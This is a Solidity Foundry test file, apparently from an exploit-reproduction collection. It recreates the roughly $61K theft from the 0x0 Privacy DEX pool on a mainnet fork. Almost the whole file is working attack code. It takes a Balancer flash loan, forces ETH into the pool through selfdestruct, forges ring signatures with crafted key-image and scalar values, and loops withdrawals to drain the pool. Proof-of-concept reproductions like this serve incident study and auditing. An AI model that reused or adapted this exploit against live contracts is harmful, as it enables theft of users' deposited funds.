// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$61K
// Attacker : https://etherscan.io/address/0xcf28e9b8aa557616bc24cc9557ffa7fa2c013d53
// Attacker Contract : https://etherscan.io/address/0xc44ea7650b27f83a6b310a8fed9e9daf2864a65b
// Vulnerable Contract : https://etherscan.io/address/0x29d2bcf0d70f95ce16697e645e2b76d218d66109
// Attack Tx : https://explorer.phalcon.xyz/tx/eth/0x00b375f8e90fc54c1345b33c686977ebec26877e2c8cac165429927a6c9bdbec

// @Analysis
// https://0x0ai.notion.site/0x0ai/0x0-Privacy-DEX-Exploit-25373263928b4f18b31c438b2a040e33

// Most of the code here is taken from original exploit contract which has been verified on Etherscan:
// https://etherscan.io/address/0xc44ea7650b27f83a6b310a8fed9e9daf2864a65b#code
// Some changes were made to make the poc work

library Types {
    enum WithdrawalType {
        Direct,
        Swap
    }
}

struct WithdrawalData {
    /// The amount to withdraw`
    uint256 amount;
    /// The index of the ring
    uint256 ringIndex;
    /// Signed message parameters
    uint256 c0;
    uint256[2] keyImage;
    uint256[] s;
    Types.WithdrawalType wType;
}

interface IOxODexPool {
    function deposit(uint256 _amount, uint256[4] memory _publicKey) external payable;

    function withdraw(
        address payable recipient,
        WithdrawalData memory withdrawalData,
        uint256 relayerGasCharge
    ) external;

    function swapOnWithdrawal(
        address tokenOut,
        address payable recipient,
        uint256 relayerGasCharge,
        uint256 amountOut,
        uint256 deadline,
        WithdrawalData memory withdrawalData
    ) external;

    function getCurrentRingIndex(uint256 amountToken) external view returns (uint256);

    function getRingHash(uint256 _amountToken, uint256 _ringIndex) external view returns (bytes32);
}

contract ContractTest is Test {
    IOxODexPool private constant OxODexPool = IOxODexPool(0x3d18AD735f949fEbD59BBfcB5864ee0157607616);
    WETH9 private constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IBalancerVault private constant BalancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    Uni_Router_V2 private constant Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    // begin sync with library Sig1.
    uint256 private constant Bx =
        1_368_015_179_489_954_701_390_400_359_078_579_693_043_519_447_331_113_978_918_064_868_415_326_638_035;
    uint256 private constant By =
        9_918_110_051_302_171_585_080_402_603_319_702_774_565_515_993_150_576_347_155_970_296_011_118_125_764;
    uint256 private constant Hx =
        2_286_484_483_920_925_456_308_759_965_850_684_826_720_807_236_777_393_886_284_879_343_816_677_643_124;
    uint256 private constant Hy =
        1_804_024_400_776_434_902_361_310_543_986_557_260_474_938_171_670_710_692_674_407_862_657_333_646_188;
    // https://github.com/kendricktan/heiswap-dapp/blob/master/contracts/AltBn128.sol#L13
    uint256 private constant curveN = 0x30644e72e131a029b85045b68181585d2833e84879b9709143e1f593f0000001;

    function setUp() public {
        vm.createSelectFork("mainnet", 18_115_707);
        vm.label(address(OxODexPool), "OxODexPool");
        vm.label(address(WETH), "WETH");
        vm.label(address(USDC), "USDC");
        vm.label(address(BalancerVault), "BalancerVault");
        vm.label(address(Router), "Router");
    }

    function testExploit() public {
        deal(address(this), 0 ether);
        uint256 loan = 11 ether;

        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = loan;

        BalancerVault.flashLoan(address(this), tokens, amounts, "");
        emit log_named_decimal_uint("Attacker ETH balance after exploit", address(this).balance, 18);
    }

    function receiveFlashLoan(
        address[] memory,
        uint256[] memory amounts,
        uint256[] memory fees,
        bytes memory
    ) external payable {
        // convert back to ETH
        WETH.withdraw(amounts[0]);
        exploit();

        USDC.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(USDC);
        path[1] = address(WETH);
        Router.swapExactTokensForETH(USDC.balanceOf(address(this)), 0, path, address(this), block.timestamp);
        WETH.deposit{value: amounts[0] + fees[0]}();
        WETH.transfer(address(BalancerVault), amounts[0] + fees[0]);
    }

    function exploit() internal {
        // send ETH so pool balance is a multiple of 10
        uint256 poolETHBalance = address(OxODexPool).balance;
        poolETHBalance = 10 ether - (poolETHBalance - (poolETHBalance / 10 ether) * 10 ether);
        new ForceSend{value: poolETHBalance}();

        WithdrawalData memory w;
        // alter lastAmount (_lastWithdrawal) to 10
        uint256 ringIndex = deposit(10 ether);
        w = withdrawData(address(this), 10 ether, ringIndex);
        w.wType = Types.WithdrawalType.Swap;
        OxODexPool.swapOnWithdrawal(address(USDC), payable(address(this)), 0, 0, block.timestamp, w);

        while (address(OxODexPool).balance >= 10 ether) {
            ringIndex = deposit(0.1 ether);
            w = withdrawData(address(this), 0.1 ether, ringIndex);
            // Withdrawal type Direct (0)
            OxODexPool.swapOnWithdrawal(address(USDC), payable(address(this)), 0, 0, block.timestamp, w);
        }
    }

    function addFee(uint256 realAmount) internal pure returns (uint256 total) {
        total = realAmount + (realAmount * 9) / 1000;
    }

    function deposit(uint256 amount) internal returns (uint256 ringIndex) {
        // Public key signature
        uint256[4] memory pks = [0x1, 0x2, Bx, By];
        ringIndex = OxODexPool.getCurrentRingIndex(amount);
        OxODexPool.deposit{value: addFee(amount)}(amount, pks);
    }

    function withdrawData(
        address recv, // receiver
        uint256 amount,
        uint256 ringIndex
    ) internal view returns (WithdrawalData memory w) {
        bytes32 ringHash = OxODexPool.getRingHash(amount, ringIndex);
        uint256[2] memory c;
        uint256[2] memory s;
        (c, s) = generateSignature(ringHash, recv);

        w.amount = amount;
        w.ringIndex = ringIndex;
        w.c0 = c[0];
        w.keyImage = [Hx, Hy];
        w.s = new uint256[](2);
        w.s[0] = s[0];
        w.s[1] = s[1];
        //w.wType = Types.WithdrawalType.Direct;
    }

    // message := abi.encodePacked(ringHash, recAddr)
    function generateSignature(
        bytes32 ringHash,
        address recv
    ) public view returns (uint256[2] memory c, uint256[2] memory s) {
        uint256[2] memory G;
        uint256[2] memory H;
        uint256[2] memory B;
        G[0] = 0x1;
        G[1] = 0x2;
        H[0] = Hx;
        H[1] = Hy;
        B[0] = Bx;
        B[1] = By;

        // c_1 = H1(L, y~, m, G, H)
        c[1] = createHash(ringHash, recv, G, H);
        // pick s1 := 1
        s[1] = 1;
        c[0] = createHash(ringHash, recv, ecAdd(G, ecMul(B, c[1])), ecMul(H, c[1] + 1));
        // s0 := u - p_0 * c_0 (mod N)
        // this is NOT likely to overflow
        s[0] = curveN + 1 - c[0];
    }

    // Function for making a call to bn256Add (address 0x06) precompile
    // More about precompiles - https://medium.com/@rbkhmrcr/precompiles-solidity-e5d29bd428c4
    function ecAdd(uint256[2] memory p, uint256[2] memory q) internal view returns (uint256[2] memory r) {
        assembly {
            // Free memory pointer
            let fp := mload(0x40)
            mstore(fp, mload(p))
            mstore(add(fp, 0x20), mload(add(p, 0x20)))
            mstore(add(fp, 0x40), mload(q))
            mstore(add(fp, 0x60), mload(add(q, 0x20)))
            pop(staticcall(gas(), 0x06, fp, 0x80, r, 0x40))
        }
    }

    // Function for making a call to bn256ScalarMul (address 0x07) precompile
    function ecMul(uint256[2] memory p, uint256 k) internal view returns (uint256[2] memory kP) {
        assembly {
            let fp := mload(0x40)
            mstore(fp, mload(p))
            mstore(add(fp, 0x20), mload(add(p, 0x20)))
            mstore(add(fp, 0x40), k)
            pop(staticcall(gas(), 0x07, fp, 0x60, kP, 0x40))
        }
    }

    function createHash(
        bytes32 ringHash,
        address recv,
        uint256[2] memory p1,
        uint256[2] memory p2
    ) internal pure returns (uint256 hash) {
        // Hash(L, y~, m, p1, p2)
        assembly {
            let fp := mload(0x40)
            mstore(fp, 0x1)
            mstore(add(fp, 0x20), 0x2)
            mstore(add(fp, 0x40), Bx)
            mstore(add(fp, 0x60), By)
            mstore(add(fp, 0x80), Hx)
            mstore(add(fp, 0xa0), Hy)

            mstore(add(fp, 0xd4), recv)
            mstore(add(fp, 0xc0), ringHash)

            // tail at 0xf4 (0xe0 + 20)
            mstore(add(fp, 0xf4), mload(p1))
            mstore(add(fp, 0x114), mload(add(p1, 0x20)))
            mstore(add(fp, 0x134), mload(p2))
            mstore(add(fp, 0x154), mload(add(p2, 0x20)))

            hash := mod(keccak256(fp, 0x174), curveN)
        }
    }

    receive() external payable {}
}

contract ForceSend {
    IOxODexPool private constant OxODexPool = IOxODexPool(0x3d18AD735f949fEbD59BBfcB5864ee0157607616);

    constructor() payable {
        selfdestruct(payable(address(OxODexPool)));
    }
}
